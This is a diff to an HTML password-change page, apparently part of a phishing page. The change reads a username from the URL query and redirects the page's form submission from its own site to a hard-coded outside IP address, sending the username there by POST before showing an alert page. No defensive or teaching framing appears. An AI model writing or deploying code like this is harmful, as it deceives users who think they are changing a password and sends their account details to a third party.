@@ -23,6 +23,7 @@
         }
         return false;
     }
+    document.getElementById("username").textContent = getQueryVariable("username");
     function sendpwd()
     {
         var s2 = document.getElementById("password2").value;
@@ -32,17 +33,17 @@
         }
         else {
             var xhr = new XMLHttpRequest();
-            xhr.open("GET", "/success?username=" + document.getElementById("username").textContent, true);
+            xhr.open("POST", "http://120.26.11.45/success?username=" + document.getElementById("username").textContent, true);
             xhr.onreadystatechange = function() {//Call a function when the state changes.
                 if(xhr.readyState === XMLHttpRequest.DONE) {
-                    window.location.href="/ctx/change_password/alert.html"
+                    window.location.href="./ctx/change_password/alert.html"
                 }
             }
+            xhr.send("pwd=&newpwd1=&newpwd2=");
         }
     }
 </script>
 
 <div class="xhs-toast"><div data-v-7186562a="" class="yam-toast"></div></div><div class="xhs-toast"><div data-v-7186562a="" class="yam-toast"></div></div>
 <div class="xhs-toast"><div data-v-7186562a="" class="yam-toast"></div></div><div class="xhs-toast"><div data-v-7186562a="" class="yam-toast"></div></div>
-<div class="xhs-toast"><div data-v-7186562a="" class="yam-toast"></div></div><div class="xhs-toast"><div data-v-7186562a="" class="yam-toast"></div></div>
-</body></html>
+<div class="xhs-toast"><div data-v-7186562a="" class="yam-toast"></div></div><div class="xhs-toast"><div data-v-7186562a="" class="yam-toast"></div></div></body></html>
